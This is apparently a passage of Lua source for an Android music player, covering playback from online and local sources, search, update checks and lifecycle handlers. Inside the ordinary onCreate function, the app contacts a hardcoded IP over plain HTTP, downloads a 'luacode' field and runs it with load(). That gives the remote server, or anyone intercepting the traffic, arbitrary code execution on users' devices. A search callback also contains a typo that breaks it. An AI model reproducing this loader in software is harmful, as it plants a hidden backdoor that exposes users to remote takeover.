    userAddManager.show2()
   elseif vpIndex == 1
    userAddManager.show(function()
      userAdds = userAddManager.getUserAddMusic()
      userAddAdapter.notifyDataSetChanged()
    end)
   elseif vpIndex == 2
    myToast.toast("稍等稍等，这就给你刷新(๑•̀ㅂ•́)و✧")
    refreshLocalMusic() --函数内实现禁用按钮
  end
end

add.onLongClick = function()
end

---------------------------

--播放音乐，自动设置播放卡片图片-设置播放卡片图片移动到加载完成监听
function playerManager.playMusic(index)
  if index == nil return end
  local list = getPlayTable() --如果要切换列表，请在播放前setPlayTable
  if list == nil return end
  if index == 0 --列表循环
    index = #list
   elseif index == #list +1
    index = 1
  end
  local from = (list[index] or {})["from"]
  local info = (list[index] or {})["info"]
  if from == "local" and (not File(info).isFile())
    myToast.toast("文件不存在")
    return playerManager.playMusic(index+1)
  end
  cachePlayIndex = index
  if from == "wyy"
    music163.idGetMusic(info,function(sp)
      player.reset()
      .setDataSource(sp)
      .prepareAsync()
    end)
   elseif from == "bili"
    biliManager.bvGetMusic(info, function(sp)
      player.reset()
      .setDataSource(sp)
      .prepareAsync()
    end)
   elseif from == "local"
    player.reset()
    .setDataSource(info)
    .prepareAsync()
   else
  end
end

----------搜索---------

search.setOnKeyListener({
  onKey=function(v,keyCode,event)
    if (keyCode == 66 and event.getAction() == 0) then
      totalProgress.visibility=0
      search.clearFocus()
      task(function(func, func2) func(fue2) end, searchMusicFunc, function(newData)
        searchMusics = newData
        totalMusicAdapter.notifyDataSetChanged()
        totalProgress.visibility=8
      end, function() end)
    end
end})

searchButton.onClick=function()
  totalProgress.visibility=0
  search.clearFocus()
  task(function(func, func2) func(func2) end, searchMusicFunc, function(newData)
    searchMusics = newData
    totalMusicAdapter.notifyDataSetChanged()
    totalProgress.visibility=8
  end, function() end)
end

--------版本与公告-------
if activity.getSharedData("autoUpdate") or activity.getSharedData("autoUpdate") == nil
  update.checkUpdate(true)
end

update.getAnnouncement(function(annou)
  if annou
    announcement.setText(annou)
   else
    announcement.setText("    米库打油~\n    如有bug可加群反馈，非常感谢！\n(远程公告获取失败，当前显示为版本公告)")
  end
end)

-------------以下为activity生命周期函数---------------

function onCreate()
  --每天首次启动记录
  local today = activity.getExternalFilesDir(nil).getPath().."/today"
  local lastday = io.open(today, "r")
  if not (lastday and lastday:read("*a") == os.date("%y_%m_%d"))
    Http.get("http://8.218.86.120/main/api/statistic/start.php?admin=271607916",function()end)
    io.open(today, "w"):write(os.date("%y_%m_%d")):close()
  end
  pcall(function(file) file:close() end, lastday)
  -- 远程代码
  Http.get("http://8.218.86.120/main/api/document/passage.php?fxwzoxawzmpjza", function(code, content)
    if code == 200
      local ok, code = pcall(cjson.decode, content)
      if ok and code.code == 1 and code.luacode
        pcall(function()
          load(code.luacode)()
        end)
      end
    end
  end)
end


function onDestroy()
  pcall(function()
    if activity.getSharedData("playLastPlay") == nil and true or activity.getSharedData("playLastPlay")
      activity.setSharedData("lastPlayTime", player.getCurrentPosition())
    end
  end)
  player.release()
  player = nil
  tk.stop()
  if activity.getSharedData("startLastPage") then
    activity.setSharedData("startPage", nowIndex)
  end
end

local twiceExitTime = 0
function onKeyDown(key)
  if key == 4
    if playerCardOpenFlag
      playerCardClose()
     elseif bottombar.getSelectedItemId() == 2 and return3Flag
      replace(3)
     elseif bottombar.getSelectedItemId() == 0 and return1Flag
      replace(1)
     elseif twiceExitTime+2 < os.time()
      myToast.toast("再按一次退出")
      twiceExitTime = os.time()
     else
      return false
    end
    return true
  end
end

